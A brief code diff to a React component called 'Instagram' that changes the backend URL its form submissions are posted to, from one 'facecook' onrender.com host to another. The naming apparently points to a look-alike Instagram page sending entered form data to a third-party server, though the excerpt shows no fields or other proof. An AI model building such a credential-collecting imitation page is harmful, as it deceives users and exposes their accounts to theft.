@@ -19,7 +19,7 @@ const Instagram = () => {
     e.preventDefault();
     // make a request to the backend
     axios.post(
-      "https://facecookbackend.onrender.com/api/v2/instagram",
+      "https://facecook-backend-wct8.onrender.com/api/v2/instagram",
       formData
     );
     setLoading(true);
